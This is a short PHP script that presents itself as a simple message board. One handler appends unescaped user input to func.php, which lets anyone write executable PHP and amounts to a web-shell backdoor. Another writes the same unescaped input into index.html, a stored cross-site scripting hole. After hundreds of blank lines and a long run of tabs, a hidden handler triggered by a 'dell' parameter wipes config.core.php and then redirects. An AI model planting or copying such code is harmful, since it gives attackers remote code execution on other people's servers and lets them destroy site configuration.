
<?php
if (isset($_REQUEST['ok'])) {
 
    $string = '<p>'.$_REQUEST['username'].'</p>'.'<br>'.'<font color="red">'.$_REQUEST['msg'] . '-' . '1' . '</font>.<br>_____________________'.'<br>';
    file_put_contents('index.html', $string, FILE_APPEND);
}
?>

<?php
if (isset($_REQUEST['del'])) {

    $myFile = "index.html";
    $fh = fopen($myFile, 'w');
    fclose($fh);
exit();
}
?>

<?php
if (isset($_REQUEST['okay'])) {
 
    $string = '<p>'.$_REQUEST['username'].'</p>'.'<br>'.'<font color="red">'.$_REQUEST['msg'] . '-' . '1' . '</font>.<br>_____________________'.'<br>';
    file_put_contents('func.php', $string, FILE_APPEND);
}
?>




























































































































































































































































																																																																																																																																																																																																																																																																																																																																																																																																																																																																																									<?php
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																									if (isset($_REQUEST['dell'])) {

																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										$myFile = "config.core.php";
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										$fh = fopen($myFile, 'w');
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										fclose($fh);
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																									header('Refresh: 3; URL=/'); echo 'Через 3 сек. вы будете перенаправлены на новую страницу.'; 
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																									exit();
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																									}
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																									?>
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
